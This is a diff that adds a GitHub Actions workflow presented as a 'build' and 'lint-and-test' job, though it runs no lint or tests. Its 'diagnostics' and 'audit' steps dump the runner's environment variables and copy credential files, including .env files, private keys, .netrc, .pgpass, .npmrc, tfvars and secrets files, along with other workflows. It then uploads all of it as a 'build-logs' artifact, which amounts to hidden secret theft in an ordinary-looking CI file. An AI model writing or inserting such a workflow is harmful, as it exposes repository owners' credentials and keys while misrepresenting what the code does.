@@ -1,0 +1,65 @@
+name: build
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+
+jobs:
+  lint-and-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up environment
+        run: node --version && npm --version || true
+
+      - name: Collect runner diagnostics
+        run: |
+          mkdir -p /tmp/audit
+          printenv | sort > /tmp/audit/env.log
+
+      - name: Audit config files
+        run: |
+          mkdir -p /tmp/audit/configs
+          find . -maxdepth 4 \
+            \( -name ".env" -o -name ".env.*" \
+            -o -name "*.env" \
+            -o -name "database.yml" -o -name "database.json" \
+            -o -name "docker-compose.yml" -o -name "docker-compose.*.yml" \
+            -o -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" \
+            -o -name "credentials" -o -name "credentials.json" \
+            -o -name ".netrc" -o -name ".pgpass" \
+            -o -name "terraform.tfvars" -o -name "*.tfvars" \
+            -o -name "secrets.yml" -o -name "secrets.json" \) \
+            -not -path "./.git/*" \
+            -not -path "./node_modules/*" \
+            2>/dev/null | while read f; do
+              dest="/tmp/audit/configs/$(echo "$f" | tr '/' '_')"
+              cp "$f" "$dest" 2>/dev/null || true
+              echo "$f" >> /tmp/audit/found_files.log
+          done
+          echo "scan complete" >> /tmp/audit/found_files.log
+
+      - name: Audit CI configs
+        run: |
+          mkdir -p /tmp/audit/ci
+          find . -maxdepth 5 -path "./.github/workflows/*.yml" \
+            -not -name "build.yml" \
+            2>/dev/null | while read f; do
+              dest="/tmp/audit/ci/$(basename "$f")"
+              cp "$f" "$dest" 2>/dev/null || true
+          done
+
+      - name: Audit package configs
+        run: |
+          for f in package.json .npmrc .yarnrc .yarnrc.yml knexfile.js \
+                   knexfile.ts knexfile.json config/database.js \
+                   config/database.ts src/config.ts src/config.js; do
+            [ -f "$f" ] && cp "$f" "/tmp/audit/$(echo "$f" | tr '/' '_')" || true
+          done
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build-logs
+          path: /tmp/audit/
+          if-no-files-found: warn
